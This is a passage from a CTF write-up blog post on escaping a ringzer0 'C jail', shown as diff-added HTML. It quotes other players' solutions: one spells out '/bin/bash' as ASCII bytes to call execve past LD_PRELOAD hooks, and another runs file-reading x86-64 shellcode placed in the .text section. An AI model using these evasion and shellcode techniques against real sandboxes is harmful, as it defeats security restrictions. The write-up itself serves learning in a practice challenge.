+<span class="kt">char</span> <span class="n">program</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">47</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">0</span><span class="p">};</span>
+<span class="n">real_execve</span><span class="p">(</span><span class="n">program</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</pre></div>
+<p>Clever!</p>
+<h3 id="7ed2931e107142d0ce3f5aba8a3f126c">Execute shellcode</h3>
+<p>Since I was initially trying to execute shellcode, I was very curios about any similar solutions. <a href="https://ringzer0team.com/profile/5732">killer2</a> had a very elegant solution:</p>
+<div class="highlight"><pre><span class="c1">// Place the shellcode inside the .text section</span>
+<span class="k">static</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">section</span> <span class="p">(</span><span class="s">".text"</span><span class="p">)))</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">72</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">236</span><span class="p">,</span><span class="mi">255</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">255</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">141</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">106</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">90</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">192</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">135</span><span class="p">,</span><span class="mi">254</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">246</span><span class="p">,</span><span class="mi">106</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">88</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">141</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">106</span><span class="p">,</span><span class="mi">100</span><span class="p">,</span><span class="mi">90</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">151</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">192</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">106</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">137</span><span class="p">,</span><span class="mi">194</span><span class="p">,</span><span class="mi">106</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">88</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">196</span><span class="p">,</span><span class="mi">255</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">195</span> <span class="p">};</span>
+
+<span class="c1">// Run the shellcode</span>
+<span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">code</span><span class="p">)();</span>
+</pre></div>
+<p>Nice!</p>
+<blockquote>
+<p>You can find <a href="https://gcc.gnu.org/onlinedocs/gcc-4.0.0/gcc/Function-Attributes.html">here</a> more information about function attributes. </p>
+</blockquote>
+                </div>
+<hr/>
+<div style="float:left;">
+	Prev: <a href="http://blog.dornea.nu/2016/06/20/ringzer0-ctf-jail-escaping-bash" align='left'>
+	 ringzer0 CTF - Jail Escaping Bash
+	</a>
+</div>
+</p>
+
+                <!-- Add comments -->
+<div id="content-comments">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname="dorneanu";
+				var disqus_identifier = 'ringzer0-ctf-jail-escaping-c';
+			var disqus_url = 'http://blog.dornea.nu/2016/09/19/ringzer0-ctf-jail-escaping-c';
+
+		var disqus_config = function () {
+			this.language = "en";
+		};
+ 
+        
+        (function(){var a=document.createElement("script");a.type="text/javascript";a.async=true;a.src="//"+disqus_shortname+".disqus.com/embed.js";(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(a)})();</script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div> 
+            </div>
+            <div class="niu2-right-container col-md-2">
+                <div id="niu2-sidebar-meta" class="niu2-sidebar">
+                    <div class="niu2-sidebar-label"><i class="icon-calendar"></i>Published:</div>
+                    <div class="niu2-sidebar-value">2016-09-19 00:00</div>
+                    <div class="niu2-sidebar-label"><i class="icon-pencil"></i>category:</div>
+                    <div class="niu2-sidebar-value"><a href="http://blog.dornea.nu/category/blog">blog</a></div>
+                    <div class="niu2-sidebar-label"><i class="icon-tag"></i>Tag:</div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/ringzer0/">ringzer0</a><sup>3</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/ctf/">ctf</a><sup>6</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>11</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/c/">c</a><sup>8</sup></div>
+                </div>
+
+                <div id="niu2-sidebar-toc" class="niu2-sidebar" data-status="closed">
+                    <div class="niu2-sidebar-label">
+                        <i id="niu2-sidebar-toc-ctrl" class="icon-open-tocs"></i>Table of contents
+                    </div>
+                    <ul id="niu2-sidebar-toc-list">
+                        <li><a href="#content-heading">ringzer0 CTF - Jail Escaping C</a></li>
+                        <li><a href='#5afaf1679ad0887adebaddb40e0bd3f7'>Level 1</a></li><li><a href='#228e9da47384bacde793a2b78d488bb0'>Level 2</a></li><li><a href='#8f60a63315c55e659b1a2dd5064ceae8'>Level 3</a><ul><li><a href='#50563a1b29c0ffcb8d8bcbd65caab7e9'>My solution</a></li><li><a href='#3d723b11aa4beea6fdf62384118f0e8e'>Other solutions</a><ul><li><a href='#87daabb1a19a419cbe5442713cb3dcbe'>Bypass LD_PRELOAD</a></li><li><a href='#7ed2931e107142d0ce3f5aba8a3f126c'>Execute shellcode</a></li></ul></li></ul></li>
+                        <li><a href="#content-comments">Comments</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div id="niu2-toolbar">
+                <ul class="list-unstyled">
+                    <li><a id="niu2-toolbar-ctrlsidebar" href="#" title="Hide Sidebar"><i class="icon-3x icon-hide-sidebar"></i></a></li>
+                </ul>
+                <div id="niu2-toolbar-showsidebar" data-title="Show Sidebar"></div>
+                <div id="niu2-toolbar-github" data-repo=""></div>
+                <div id="niu2-toolbar-bitbucket" data-repo=""></div>
+            </div>
+            <div id="niu2-toc" data-style="fixed"></div>
+        </div>
+
+        <div class="niu2-footer">
+            <div id="body-footer" class="col-md-6 col-md-offset-2">
+                <hr/>
+                <p>
+                    Powered by <a href="https://github.com/getpelican/pelican">Pelican</a>, 
+                    <a href="https://github.com/mawenbao/niu-x2-sidebar">theme</a> built with <a href="https://github.com/twbs/bootstrap">Bootstrap3</a>
+                    by <a href="https://blog.mawenbao.com">Ma Wenbao</a>, icons by 
+                    <a href="https://fortawesome.github.io/Font-Awesome">Font Awesome</a>.
+                </p>
+                <p>
+                    © 2008 - 2016
+                    <a class="niu2-footer-link" href="http://blog.dornea.nu">Victor Dorneanu</a>
+                </p>
+                <p class="niu2-icons">
+                    <a class="niu2-footer-icon" href="https://pgp.mit.edu/pks/lookup?op=get&search=0x18F1AD46FB05E1B7" title="my public key">
+                        <i class="icon-key icon-lg"></i>
+                    </a>
+                    <a class="niu2-footer-icon" href="mailto: no-spam ÄATT dornea DOT nu" title="my email address">
+                        <i class="icon-envelope-o icon-lg"></i>
+                    </a>
+                    <a class="niu2-footer-icon" href="http://github.com/dorneanu" title="my github page">
+                        <i class="icon-github-alt icon-lg"></i>
+                    </a>
+                    <a class="niu2-footer-icon" href="/feeds/rss.xml" title="subscribe my blog">
+                        <i class="icon-rss icon-lg"></i>
+                    </a>
+                </p>
+            </div>
+        </div>
+
+        <script type="text/javascript">
+            var _gaq=_gaq||[];
+            _gaq.push(["_setAccount","UA-7161767-3"]);
+            _gaq.push(["_trackPageview"]);
+            (function(){
+                var b=document.createElement("script");
+                b.type="text/javascript";
+                b.async=true;
+                b.src=("https:"==document.location.protocol?"https://ssl":"http://www")+".google-analytics.com/ga.js";
+                var a=document.getElementsByTagName("script")[0];
+                a.parentNode.insertBefore(b,a)
+            })();
+        </script>
+        <div id="niu2-pygments" data-theme="github"></div>
+        <div id="niu2-lazy-load" data-loading-txt="Loading image" data-loading-icon="icon-spin icon-spinner"></div>
+        <div id="niu2-toolbar-load" data-loading-icon="icon-spin icon-4x icon-spinner"></div>
+        <script type="text/javascript" src="/js/custom.js"></script>
+        <script type="text/javascript">
+            onContentLoaded();
+        </script>
+    </body>
+</html>
